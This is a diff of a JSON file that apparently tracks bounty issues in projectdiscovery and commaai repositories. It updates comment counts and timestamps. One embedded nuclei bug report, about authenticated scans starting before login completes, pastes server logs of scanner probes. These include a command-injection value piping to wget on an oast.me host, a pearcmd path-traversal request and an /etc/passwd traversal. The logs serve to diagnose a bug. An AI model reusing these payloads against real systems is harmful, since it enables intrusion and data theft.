@@ -59,11 +59,11 @@
       "💎 Bounty",
       "$100"
     ],
-    "comment_count": 21,
+    "comment_count": 22,
     "open_pr_count": 6,
     "repository": "projectdiscovery/nuclei",
     "created_at": "2025-11-06T15:54:58Z",
-    "updated_at": "2026-02-28T21:43:29Z",
+    "updated_at": "2026-03-02T07:33:44Z",
     "author": "anze3db",
     "body": "### Is there an existing issue for this?\n\n- [x] I have searched the existing issues.\n\n### Current Behavior\n\nWhen running an authenticated scan using a secret file nuclei starts executing templates immediately, before the secret file finishes, causing some requests to not be authenticated.\n\ncommand that I'm running:\n\n```\nnuclei3.4.dev -secret-file django-login.yaml -target http://localhost:8000/ -v\n```\n\nWhen I print the server logs I see all requests before the secret file finishes as unauthenticated (See AnyonymousUser):\n\n\n```\n15:32:48.443 | WARNING | django.request - Not Found: /wp-content/plugins/flash-album-gallery/readme.txt\n15:32:48.446 | WARNING | django.server - \"GET /wp-content/plugins/flash-album-gallery/readme.txt HTTP/1.1\" 404 23770\n15:32:48.450 | WARNING | django.request - Not Found: /wp-content/plugins/skysa-official/readme.txt\nAnonymousUser\nAnonymousUser\n15:32:48.491 | WARNING | django.server - \"GET /wp-content/plugins/skysa-official/readme.txt HTTP/1.1\" 404 23750\nAnonymousUser\nAnonymousUser\nAnonymousUser\nAnonymousUser\nAnonymousUser\nAnonymousUser\n15:32:48.554 | WARNING | django.request - Not Found: /login-x.php\nAnonymousUser\n15:32:48.641 | WARNING | django.server - \"GET /login-x.php HTTP/1.1\" 404 23619\nAnonymousUser\nAnonymousUser\nAnonymousUser\nAnonymousUser\nAnonymousUser\n15:32:48.946 | WARNING | django.request - Not Found: /guest_auth/guestIsUp.php\n15:32:48.950 | WARNING | django.server - \"POST /guest_auth/guestIsUp.php HTTP/1.1\" 404 23672\n15:32:48.950 | INFO    | django.server - code 400, message Bad HTTP/0.9 request type ('mac=1&ip=127.0.0.1|wget')\n15:32:48.950 | WARNING | django.server - \"mac=1&ip=127.0.0.1|wget d46bv7aqko33m6d2te7g4b8fu93o1zo7w.oast.me\" 400 -\nAnonymousUser\n15:32:48.994 | WARNING | django.request - Not Found: /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx\n15:32:48.996 | WARNING | django.server - \"POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1\" 404 23884\nAnonymousUser\n15:32:49.290 | INFO    | django.server - \"POST /accounts/login/ HTTP/1.1\" 302 0\n <engbot@example.com>\n15:32:49.476 | WARNING | django.request - Not Found: /wp-content/plugins/featurific-for-wordpress/readme.txt\n15:32:49.482 | WARNING | django.server - \"GET /wp-content/plugins/featurific-for-wordpress/readme.txt HTTP/1.1\" 404 23791\n <engbot@example.com>\n15:32:49.592 | WARNING | django.request - Not Found: /wp-content/plugins/clickdesk-live-support-chat/readme.txt\n15:32:49.599 | WARNING | django.server - \"GET /wp-content/plugins/clickdesk-live-support-chat/readme.txt HTTP/1.1\" 404 23803\n15:32:49.655 | WARNING | django.request - Not Found: /lcms/index.php\n15:32:49.657 | WARNING | django.server - \"POST /lcms/index.php HTTP/1.1\" 404 23632\n <engbot@example.com>\n15:32:49.683 | WARNING | django.security.csrf - Forbidden (CSRF cookie not set.): /\n15:32:49.690 | WARNING | django.request - Not Found: /wp-content/plugins/all-in-one-event-calendar/readme.txt\n15:32:49.694 | INFO    | django.server - \"GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/safedog()+sBV3dCd1eI.log HTTP/1.1\" 302 0\n15:32:49.695 | WARNING | django.server - \"GET /wp-content/plugins/all-in-one-event-calendar/readme.txt HTTP/1.1\" 404 23795\n <engbot@example.com>\n```\n\nOnly once `POST /accounts/login/` finishes do the requests start being authenticated (see engbot@example.com) instead of Anonymous user.\n\n### Expected Behavior\n\nI would expect nuclei to first run the secret-file and only after it finishes start running the other templates. This was the behavior on Nuclei 3.4.7, before the [authenticated scan regression in 3.4.8](https://github.com/projectdiscovery/nuclei/issues/6463).\n\nThis is how the server logs look when I run the same code on 3.4.7:\n\n\n```\nnuclei3.4.7 -secret-file django-login.yaml -target http://localhost:8000/ -v\n```\n\n```\nAnonymousUser\n15:50:23.744 | INFO    | django.server - \"GET /accounts/login/ HTTP/1.1\" 200 25860\nAnonymousUser\n15:50:23.931 | INFO    | django.server - \"POST /accounts/login/ HTTP/1.1\" 302 0\n <engbot@example.com>\n15:50:25.028 | WARNING | django.request - Not Found: /export/classroom-course-statistics\n <engbot@example.com>\n <engbot@example.com>\n15:50:25.031 | WARNING | django.server - \"GET /export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd HTTP/1.1\" 404 23797\n <engbot@example.com>\n15:50:25.058 | WARNING | django.request - Not Found: /cgi-bin/rpc\n15:50:25.059 | WARNING | django.server - \"POST /cgi-bin/rpc HTTP/1.1\" 404 23618\n <engbot@example.com>\n <engbot@example.com>\n <engbot@example.com>\n15:50:25.364 | WARNING | django.request - Not Found: /zentao/user-login.html\n15:50:25.365 | WARNING | django.server - \"POST /zentao/user-login.html HTTP/1.1\" 404 23663\n15:50:25.370 | WARNING | django.request - Not Found: /general/index/UploadFile.php\n15:50:25.371 | WARNING | django.request - Not Found: /webadm/\n```\n\n### Steps To Reproduce\n\n1. Run nuclei with a secret-file\n\n```\nnuclei -secret-file django-login.yaml -target http://localhost:8000/ -v\n```\n\n### Relevant log output\n\n```shell\n\n```\n\n### Environment\n\n```markdown\n- OS: Macos\n- Nuclei: 3.4.10 53af79a39290c86857f433bb2f40e4567982fed0\n- Go: go version go1.24.2 darwin/arm64\n```\n\n### Anything else?\n\n_No response_",
     "hunter_intelligence": {
@@ -185,11 +185,11 @@
       "💎 Bounty",
       "$100"
     ],
-    "comment_count": 23,
+    "comment_count": 24,
     "open_pr_count": 7,
     "repository": "projectdiscovery/httpx",
     "created_at": "2025-08-13T02:24:40Z",
-    "updated_at": "2026-02-28T16:52:53Z",
+    "updated_at": "2026-03-02T08:56:36Z",
     "author": "khs-alt",
     "body": "### Versions\n- httpx: v1.7.1\n- retryablehttp-go: v1.0.119\n\n### Current Behavior: \nIf you see httpx repo`common/httpx/httpx.go` 156 line\n``` go\n\tif httpx.Options.Protocol == \"http11\" {\n\t\t// disable http2\n\t\tos.Setenv(\"GODEBUG\", \"http2client=0\")\n\t\ttransport.TLSNextProto = map[string]func(string, *tls.Conn) http.RoundTripper{}\n\t}\n```\nWhen using HTTP 1.1, change transport, and it will use retryablehttp\nBut if we see retryablehttp repo `do.go` 62 line\n``` go\n\t\t// if err is equal to missing minor protocol version retry with http/2\n\t\tif err != nil && stringsutil.ContainsAny(err.Error(), \"net/http: HTTP/1.x transport connection broken: malformed HTTP version \\\"HTTP/2\\\"\", \"net/http: HTTP/1.x transport connection broken: malformed HTTP response\") {\n\t\t\tresp, err = c.HTTPClient2.Do(req.Request)\n\t\t\tcheckOK, checkErr = c.CheckRetry(req.Context(), resp, err)\n\t\t}\n```\nThis issue is caused by the retry behavior in retryablehttp-go, as discussed in\n  projectdiscovery/retryablehttp-go#3.\nIf httpx set client for using only http1.1 but retryable use another client in this case so `-pr` does not work correctly.\n### Expected Behavior:\n<!-- A concise description of what you expected to happen. -->\nUse transport change client when httpx `-pr` is on\n\n### Suggestion\n\nAdd Options.DisableHTTPFallback (Example). If set, skip the HTTP/2 fallback (HTTPClient2) on malformed HTTP/2 errors and treat them according to the retry policy. \nThis respects explicit HTTP/1.1-only configs and avoids unintended protocol switches and policy divergence      (proxy/dialer/redirect/TLS)\n",
     "hunter_intelligence": {
@@ -360,11 +360,11 @@
       "💎 Bounty",
       "$25"
     ],
-    "comment_count": 10,
+    "comment_count": 11,
     "open_pr_count": 4,
     "repository": "projectdiscovery/nuclei",
     "created_at": "2022-05-25T11:24:01Z",
-    "updated_at": "2026-03-02T04:50:23Z",
+    "updated_at": "2026-03-02T07:34:26Z",
     "author": "forgedhallpass",
     "body": "",
     "hunter_intelligence": {
@@ -458,7 +458,7 @@
       "bounty"
     ],
     "comment_count": 7,
-    "open_pr_count": 1,
+    "open_pr_count": 2,
     "repository": "commaai/panda",
     "created_at": "2025-07-25T20:42:52Z",
     "updated_at": "2026-02-24T09:45:51Z",
